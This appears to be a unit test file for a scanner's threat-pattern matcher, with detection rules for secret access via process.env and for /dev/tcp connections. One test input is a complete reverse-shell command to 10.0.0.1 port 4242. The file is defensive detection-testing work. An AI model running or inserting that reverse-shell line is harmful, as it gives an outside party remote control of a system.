import { describe, it, expect } from 'vitest';
import { matchLine } from '../matcher.js';
import type { ThreatPattern } from '../types.js';

const testPattern: ThreatPattern = {
  id: 'test_pattern',
  category: 'exfiltration',
  severity: 'high',
  name: 'Test pattern',
  description: 'Test',
  regex: /process\.env\b/,
  fileExtensions: ['js'],
};

const multiPattern: ThreatPattern = {
  id: 'test_multi',
  category: 'persistence',
  severity: 'critical',
  name: 'Multi test',
  description: 'Test',
  regex: /\/dev\/tcp\//,
  fileExtensions: ['sh'],
};

describe('matchLine', () => {
  it('returns empty for non-matching line', () => {
    const results = matchLine('const x = 42;', 1, [testPattern]);
    expect(results).toHaveLength(0);
  });

  it('matches a single pattern', () => {
    const results = matchLine('const key = process.env.SECRET;', 5, [testPattern]);
    expect(results).toHaveLength(1);
    expect(results[0].patternId).toBe('test_pattern');
    expect(results[0].line).toBe(5);
    expect(results[0].match).toBe('process.env');
  });

  it('reports correct column', () => {
    const line = '  const key = process.env.SECRET;';
    const results = matchLine(line, 1, [testPattern]);
    expect(results[0].column).toBe(14);
  });

  it('returns full line as context', () => {
    const line = 'const key = process.env.SECRET;';
    const results = matchLine(line, 1, [testPattern]);
    expect(results[0].context).toBe(line);
  });

  it('matches multiple patterns on same line', () => {
    const combinedPattern: ThreatPattern = {
      id: 'test_env2',
      category: 'exfiltration',
      severity: 'medium',
      name: 'Env2',
      description: 'Test',
      regex: /SECRET/,
      fileExtensions: ['js'],
    };
    const results = matchLine('const key = process.env.SECRET;', 1, [testPattern, combinedPattern]);
    expect(results).toHaveLength(2);
    expect(results[0].patternId).toBe('test_pattern');
    expect(results[1].patternId).toBe('test_env2');
  });

  it('handles regex with special characters', () => {
    const results = matchLine('bash -i >& /dev/tcp/10.0.0.1/4242', 1, [multiPattern]);
    expect(results).toHaveLength(1);
    expect(results[0].match).toBe('/dev/tcp/');
  });

  it('returns empty for empty line', () => {
    const results = matchLine('', 1, [testPattern]);
    expect(results).toHaveLength(0);
  });

  it('returns empty when no patterns provided', () => {
    const results = matchLine('process.env.SECRET', 1, []);
    expect(results).toHaveLength(0);
  });
});
